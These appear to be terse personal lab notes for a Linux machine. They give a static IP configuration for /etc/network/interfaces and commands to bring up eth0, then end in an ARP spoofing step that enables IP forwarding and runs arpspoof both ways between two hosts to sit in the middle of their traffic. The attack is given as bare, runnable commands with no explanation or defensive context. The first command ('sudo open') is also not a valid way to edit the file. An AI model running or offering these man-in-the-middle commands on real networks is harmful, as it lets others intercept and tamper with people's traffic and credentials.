1)sudo open /etc/network/interfaces/
#data to be entered in the file
# Loopback interface
auto lo
iface lo inet loopback

# Ethernet interface (change 'eth0' to your actual interface name)
auto eth0    # or ens33, enp0s3, etc. based on your output
iface eth0 inet static
    address 192.168.165.136  # Your desired static IP
    netmask 255.255.255.0     # Subnet mask
    gateway 192.168.165.166      # Replace with your actual gateway (usually your router IP)

2)network setup
#run this in a terminal each time you restart
sudo ip link set eth0 up
sudo ip addr add 192.168.165.136/24 dev eth0
sudo ip route add default via 192.168.165.166
sudo systemctl restart networking

3)arpspoofing
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.165.135 192.168.165.40
sudo arpspoof -i eth0 -t 192.168.165.40 192.168.165.135